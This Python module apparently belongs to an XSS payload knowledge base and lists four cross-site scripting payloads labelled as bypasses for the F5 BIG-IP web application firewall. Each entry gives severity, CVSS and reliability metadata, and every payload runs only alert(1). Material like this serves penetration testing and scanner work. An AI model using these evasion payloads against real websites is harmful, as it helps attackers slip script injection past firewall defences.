#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

F5 BIG-IP WAF Bypass Payloads
"""

from ..models import PayloadEntry


F5_BYPASS_PAYLOADS = {
    "f5_1": PayloadEntry(
        payload="<Img Src=x OnError=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Mixed case img tag",
        tags=["f5", "bigip", "case"],
        waf_evasion=True,
        bypasses=["f5"],
        reliability="medium",
    ),
    "f5_2": PayloadEntry(
        payload="<img/src=x/onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Forward slash instead of space",
        tags=["f5", "bigip", "slash"],
        waf_evasion=True,
        bypasses=["f5"],
        reliability="medium",
    ),
    "f5_3": PayloadEntry(
        payload="<img src=x onerror='alert(1)'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Single quotes in handler",
        tags=["f5", "bigip", "quotes"],
        waf_evasion=True,
        bypasses=["f5"],
        reliability="medium",
    ),
    "f5_4": PayloadEntry(
        payload="<svg><script>al\\u0065rt(1)</script></svg>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Unicode escape in SVG script",
        tags=["f5", "bigip", "unicode", "svg"],
        waf_evasion=True,
        bypasses=["f5"],
        reliability="high",
    ),
}

F5_BYPASS_PAYLOADS_TOTAL = len(F5_BYPASS_PAYLOADS)
